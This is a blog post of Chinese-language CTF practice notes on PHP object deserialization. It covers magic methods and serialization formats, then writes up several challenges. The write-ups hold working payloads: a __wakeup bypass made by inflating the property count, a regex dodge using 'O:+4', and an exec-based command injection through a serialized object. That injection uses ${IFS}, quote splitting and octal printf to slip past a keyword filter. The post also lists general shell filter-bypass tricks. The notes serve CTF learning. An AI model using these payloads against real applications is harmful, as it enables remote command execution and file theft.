---
title: ctf-web练习(php)
date: 2023-09-18 00:30:52
tags:
categories:
  - [ctf-web]
  - 渗透
---
# ctf-web练习(php)--待补充

## php知识

### php的魔术方法

- __construct() 当一个对象创建时被调用 --构造函数
- __destruct() 当一个对象销毁时被调用 --析构函数
- __wakeup() 使用unserialize时触发
- __sleep() 使用serialize时触发
- __toString()  当一个对象被当做一个字符串时来使用

### php的变量类型

public：属性被序列化的时候属性值会变成 `属性名`

protected：属性被序列化的时候属性值会变成 `\x00*\x00属性名`

private：属性被序列化的时候属性值会变成 `\x00类名\x00属性名`

```php
<?php
class People{
    public $id;
    protected $gender;
    private $age;
    public function __construct(){
        $this->id = 'Hardworking666';
        $this->gender = 'male';
        $this->age = '18';
    }
}
$a = new People();
echo serialize($a);
?>
//O:6:"People":3:{s:2:"id";s:14:"Hardworking666";s:9:" * gender";s:4:"male";s:11:" People age";s:2:"18";}

```

注意：比如，$file 是私有成员，序列化之后字符串首尾会多出两个空格 “%00*%00”，如果有时候利用html网页复制值可能会出现问题。

### php序列化和反序列化

PHP序列化：serialize()

序列化是将变量或对象转换成字符串的过程，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。

而PHP反序列化：unserialize()

反序列化是将字符串转换成变量或对象的过程。

从序列化到反序列化这几个函数的执行过程是：

```php
__construct()` ->`__sleep()` -> `__wakeup()` -> `__toString()` -> `__destruct()
```

```php
<?php  
class TEST{  
 public $test1="11";  
 private $test2="22";  
 protected $test3="33";  
 public function test4()  
 {  
 echo $this->test1;  
 }  
}  
$a=new TEST();  
echo serialize($a); 
?>
//O:4:"TEST":3:{s:5:"test1";s:2:"11";s:11:"TESTtest2";s:2:"22";s:8:"*test3";s:2:"33";}
//O代表类，然后后面4代表类名长度，接着双引号内是类名
//然后是类中变量的个数：{类型：长度:"值"；类型:长度:"值"...以此类推}
//有时候为了避免private和protected导致一些字符不可打印，通常会urlencode一下

```

### call_user_func_array函数

（1）普通使用：

```php
function a($b, $c) 
{  
echo $b; 
echo $c; 
} 
call_user_func_array('a', array("111", "222")); 
//输出 111 222
```

 


（2）调用类内部的方法：

```php
Class ClassA 
{ 
function bc($b, $c)
{ 
$bc = $b + $c; 
echo $bc; 
} 
} 

call_user_func_array(array('ClassA','bc'), array("111", "222")); 
//输出  333 
```

参考链接：https://blog.csdn.net/weihuiblog/article/details/78998924

## 题目

### 1. ctf-web-“PHP2” 

- phps文件就是php的**源代码文件**，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用**phps**文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。

- 运用后台扫描工具

  

### 2. ctf-web-unserialize3

##### **原理**

PHP**反序列化漏洞**：执行unserialize()时，先会调用__wakeup()。

当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过__wakeup()。

（**影响版本**php5<5.6.25,php7<7.010）已经测试过，在本机php8.2中，并不会有该漏洞的出现。

##### **目的**

了解绕过常见的**函数过滤**机制

### 3.Web_php_unserialize

类似于上题，只是多了一个正则过滤问题

![image-20230925181847920](https://s2.loli.net/2023/09/25/vbW31rf7uKmqcSk.png)

```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}

    $A = new Demo('fl4g.php');
    $C = serialize($A);
    //string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
    $C = str_replace('O:4', 'O:+4',$C);//绕过preg_match
    $C = str_replace(':1:', ':2:',$C);//绕过wakeup

    var_dump(base64_encode($C));
   

    
?>
```

曾出现的问题：

$file 是私有成员序列化之后字符串首尾会多出两个空格 “%00*%00”，所以base64加密最好在代码中执行防止复制漏掉----本人刚开始的解题思路便是启动服务器输出序列化后的字符串然后进行复制，再在代码中进入下一步操作，然后出现了问题。

### 4.unseping

源码：

```php
<?php
highlight_file(__FILE__);

class ease{
  
  private $method;
  private $args;
  function __construct($method, $args) {
    $this->method = $method;
    $this->args = $args;
  }
 
  function __destruct(){
    if (in_array($this->method, array("ping"))) {
      call_user_func_array(array($this, $this->method), $this->args);
    }
  } 
 
  function ping($ip){
    exec($ip, $result);
    var_dump($result);
  }

  function waf($str){
    if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
      return $str;
    } else {
      echo "don't hack";
    }
  }
 
  function __wakeup(){
    foreach($this->args as $k => $v) {
      $this->args[$k] = $this->waf($v);
    }
  }  
}

$ctf=@$_POST['ctf'];
@unserialize(base64_decode($ctf));
?>
```

注意项为：传入的args需要为array数组

首先尝试执行未被过滤的命令：

```php
$a=new ease("ping",array("pwd"));
echo base64_encode(serialize($a));
//Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozOiJwd2QiO319
```

采用post方法传参，可以看到成功执行pwd命令。

那么接下来就是替换成其他的命令，且要绕过正则过滤。

该题的构造：

```php
$a=new ease("ping",array('more${IFS}fl""ag_1s_here$(printf${IFS}"\57")f\lag_831b69012c67b35f.p\hp'));
echo base64_encode(serialize($a));
```

稍微记录下一些绕过：

(命令行知识：$()这个符号，可以把括号里面的东西当命令执行,反引号同理。)

- 反斜线\绕过

  ```bash
  $ l\s
  ```

- ${IFS},$IFS代替空格

- 拼接法：

  ```bash
  $ a=fl;b=ag;cat$IFS$a$b
  ```

- 引号绕过

  ```bash
  //如cat、ls被过滤
  $ ca""t /flag
  $ l's' /
  ```

- 八进制编码和十六进制编码绕过

  比如：“/“的八进制编码为\57，那么使用$(printf${IFS}”\57”)**内敛执行输出**“/”到字符串中。

  所以该题在应对flag被正则过滤时也可以：（\141是a的八进制编码）

  ```php
  $a=new ease("ping",array('more${IFS}fl$(printf${IFS}"\141")g_1s_here$(printf${IFS}"\57")f\lag_831b69012c67b35f.p\hp'));
  echo base64_encode(serialize($a));
  ```

- cat的替换命令

  | tac  | 与cat相反，按行反向输出                            |
  | ---- | -------------------------------------------------- |
  | more | 按页显示，用于文件内容较多且不能滚动屏幕时查看文件 |
  | less | 与more类似                                         |
  | tail | 查看文件末几行                                     |
  | head | 查看文件首几行                                     |



## 参考链接

php反序列化：

https://zhuanlan.zhihu.com/p/601673949

https://blog.csdn.net/Hardworking666/article/details/122373938

https://www.cnblogs.com/hugboy/p/web_php_unserialize.html

rce绕过:

https://blog.csdn.net/m0_73185293/article/details/131557169
